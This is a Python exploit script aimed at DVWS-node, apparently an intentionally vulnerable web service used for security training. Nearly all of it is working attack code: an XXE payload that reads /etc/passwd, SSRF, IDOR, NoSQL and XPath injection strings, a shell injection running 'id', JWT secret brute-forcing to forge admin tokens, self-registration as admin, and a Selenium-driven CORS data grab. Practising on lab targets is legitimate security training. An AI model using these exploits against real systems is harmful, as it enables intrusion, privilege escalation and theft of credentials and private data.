import sys
import requests
import xml.etree.ElementTree as ET
from fake_useragent import UserAgent
from seleniumwire import webdriver
import time
import json
from bs4 import BeautifulSoup
import jwt

# https://github.com/snoopysecurity/dvws-node 

URL = "your_host"
login = ''
password = ''
version = '0.0.1'

NAMESPACES = {
    'xsi' : 'http://www.w3.org/2001/XMLSchema-instance',
    'xsd' : 'http://www.w3.org/2001/XMLSchema',
    'soap': 'http://schemas.xmlsoap.org/soap/envelope/',
    'urn' : 'urn:examples:usernameservice',
    'encoding': 'http://schemas.xmlsoap.org/soap/encoding/'
}

ROUTES = {
    'api_route'    : '/api/v2',
    'old_api_route': '/api/v1',
    'usr_service'  : '/dvwsuserservice',
    'note_search'  : '/notesearch',
    'xmlrpc'       : ':9090/xmlrpc',
    'notes'        : '/notes',
    'users'        : '/users',
    'login'        : '/login',
    'docs'         : '/api-docs',
    'info'         : '/info',
    'sysinfo'      : '/sysinfo',
    'passphrase'   : '/passphrase',
    'check_admin'  : '/checkadmin',
    'uploads'      : '/uploads',
    'release'      : '/release'
}
user_agent = UserAgent(verify_ssl=False).random

headers = {
    'User-Agent' : user_agent,
    'Connection' : 'close',
    'Host' : URL
}

def get_driver():
    # Driver options
    options = webdriver.FirefoxOptions()
    options.set_preference("general.useragent.override", user_agent)
    options.set_preference("dom.webdriver.enabled", False)
    # options.headless = True

    return webdriver.Firefox(executable_path='path_to_geckodriver', options=options)

def xxe_vuln(): # XXE
    if not URL.strip():
        return None
    headers.update({'SOAPAction' : 'Username','Content-Type' : 'text/xml;charset=UTF-8'})
    body = f"""<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE root [ <!ENTITY pass SYSTEM "file:///etc/passwd"> ]>
                <soapenv:Envelope xmlns:xsi="{NAMESPACES['xsi']}" xmlns:xsd="{NAMESPACES['xsd']}" xmlns:soapenv="{NAMESPACES['soap']}" xmlns:urn="{NAMESPACES['urn']}">
                    <soapenv:Header/>
                        <soapenv:Body>
                            <urn:Username soapenv:encodingStyle="{NAMESPACES['encoding']}">
                                <username xsi:type="xsd:string">&pass;</username>
                            </urn:Username>
                        </soapenv:Body>
                </soapenv:Envelope>"""

    response = requests.post(URL + ROUTES['usr_service'], headers = headers, data=body)
    if response.status_code == 200 :
        tree = ET.fromstring(response.content)
        result = tree.findall(
            './soap:Body'
            '/urn:UsernameResponse'
            '/username',
            NAMESPACES,
        )
        print(f"Tag - {result[0].tag}\nResult - {result[0].text}")

def ssrf_vuln(): # SSRF
    headers.update({'Content-Type' : 'text/xml;charset=UTF-8','Accept' : 'text/xml'})
    body = f"""<?xml version="1.0"?>
                <methodCall>
                <methodName>dvws.CheckUptime</methodName>
                    <params><param>
                        <value><string>{URL}/uptime</string></value>
                    </param></params>
                </methodCall>"""
    response = requests.post(URL + ROUTES['xmlrpc'], headers = headers, data=body)
    if response.status_code == 200 :
        print(response.content)

def get_note_by_id(note_id): # IDOR
    token = logining()
    headers.update({'Authorization' : f'Bearer {token}','Content-Type' : 'application/json;charset=UTF-8','Accept' : 'application/json, text/plain, */*' })
    response = requests.get(URL + ROUTES['api_route'] + ROUTES['notes'] + f'/{str(note_id)}', headers = headers)
    if response.status_code == 200 :
        return json.loads(response.content)
   
def get_all_notes(): # NoSQL INJ
    token = logining()
    headers.update({'Authorization' : f'Bearer {token}','Content-Type' : 'application/json;charset=UTF-8','Accept' : 'application/json, text/plain, */*' })
    data = {"search" : "Gora' || 'a'=='a"}
    response = requests.post(URL + ROUTES['api_route'] + ROUTES['note_search'], headers = headers, json=data)
    if response.status_code == 200 :
        print(json.loads(response.content))

def change_note(note_id): # Horizontal Access Control
    token = logining()
    note = get_note_by_id(note_id)
    print(note)
    if note != None:
        headers.update({'Authorization' : f'Bearer {token}','Content-Type' : 'application/json;charset=UTF-8','Accept' : 'application/json, text/plain, */*' })
        new_data = json.dumps({"type" : ['public'], 'user' : login})
        response = requests.put(URL + ROUTES['api_route'] + ROUTES['notes'] + f'/{str(note_id)}', headers = headers, data=new_data)
        if response.status_code == 200 :
            print(json.loads(response.content))

def logining():
        headers.update({'Content-Type' : 'application/x-www-form-urlencoded','Accept' : 'application/json, text/plain, */*' })
        credentials = {'username' : login,
                       'password' : password }
        response = requests.post(URL + ROUTES['api_route'] + ROUTES['login'], headers = headers, data=credentials)
        if response.status_code == 200:
            return json.loads(response.content)['token']

def register():
    headers.update({'Content-Type' : 'application/x-www-form-urlencoded','Accept' : 'application/json, text/plain, */*' })
    credentials = {'username' : login,
                    'password' : password,
                    'admin'   : 'true'  }
    response = requests.post(URL + ROUTES['api_route'] + ROUTES['users'], headers = headers, data=credentials)
    if response.status_code == 201 or response.status_code == 409:
        return logining()

def api_info_v1(): # Information Disclosure
    headers.update({'Accept' : 'application/json, text/plain, */*' })
    response = requests.get(URL + ROUTES['old_api_route'] + ROUTES['info'], headers = headers)
    if response.status_code == 200:
        print(json.loads(response.content))

def get_server_info(): # Shell INJ | Vertical Access Control
    token = logining()
    headers.update({'Authorization' : f'Bearer {token}','Accept' : 'application/json, text/plain, */*' })
    response = requests.get(URL + ROUTES['api_route'] + ROUTES['sysinfo'] + '/ls %0A id', headers = headers)
    if response.status_code == 200:
        print(response.content)

def get_passphares(username): # JSON Hijacking | Horizontal Access Control | CORS
    token = logining()
    headers.update({'Authorization' : f'Bearer {token}','Accept' : 'application/json, text/plain, */*' })
    response = requests.get(URL + ROUTES['api_route'] + ROUTES['passphrase'] + f'/{username}', headers = headers)
    if response.status_code == 200:
        print(json.loads(response.content))

def check_admin(jwt_token):
    headers.update({'Authorization' : f'Bearer {jwt_token}','Accept' : 'application/json, text/plain, */*' })
    response = requests.get(URL + ROUTES['api_route'] + ROUTES['users'] + ROUTES['check_admin'], headers = headers)
    if response.status_code == 200:
        return json.loads(response.content)

def set_admin_access(): # JWT Secret Key Brute Force
    # https://github.com/NotSoSecure/json_web_tokens/blob/master/brute-jwt.py
    print ("Script to brute-force JWT secret token")
    token = logining()

    with open('passwords.txt') as secrets:
        for secret in secrets:
            try:
                key = secret.rstrip()
                admin_access = 'user:admin'
                payload = jwt.decode(token, key, algorithms=['HS256'])
                print ('Success! Token decoded with ....[' + key + ']')
                if not admin_access in payload['permissions']:
                    payload['permissions'].append(admin_access)
                print(check_admin(jwt.encode(payload,key)))
                return
            except jwt.InvalidTokenError:
                print ('Invalid Token .... [' + key + ']')
            except jwt.ExpiredSignatureError:
                print ('Token Expired ....[' + key + ']')
def hidden_route(): # Vertical Access Control
    token = logining()
    headers.update({'Authorization' : f'Bearer {token}','Accept' : 'application/json, text/plain, */*' })
    response = requests.get(URL + ROUTES['api_route'] + ROUTES['users'] + '/', headers = headers)
    if response.status_code == 200:
        print(json.loads(response.content))

def get_uploaded_xml_file(file_name = 'creds.xml'): # Vertical Access Control
    headers.update({'Accept' : 'application/json, text/plain, */*'})
    response = requests.get(URL + ROUTES['uploads'] + f'/{login}/{file_name}', headers = headers)
    if response.status_code == 200 :
        tree = ET.fromstring(response.content)
        print(f"{tree.find('FirstName').text} | {tree.find('Username').text} | {tree.find('Password').text}")

def cors_bypass(): # CORS
    try:
        driver = get_driver()
        driver.get(URL)
        js_cors_script = f'''
            function cors() {{  
            var xhttp = new XMLHttpRequest();  
            xhttp.onreadystatechange = function() {{    
                    if (this.status == 200) {{    
                    alert(this.responseText);     
                    document.getElementById("demo").innerHTML = this.responseText;    
                    }}
                }};  
            xhttp.open("GET", "{URL}/api/v2/passphrase/{login}", true);  
            xhttp.withCredentials = true;  
            xhttp.send();
            }}
            cors();
        '''
        driver.execute_script(js_cors_script)
        time.sleep(100)
    except Exception as ex:
        print(ex)
    finally:
        driver.close()

def get_config(): # XPath INJ
    payload = "'or'1'='1'or'a'='a"
    response = requests.get(URL + ROUTES['api_route'] + ROUTES['release'] + f'/{version}' + payload , headers = headers)
    if response.status_code == 200:
        for val in response.text.split(','):
            print(val)

get_config()
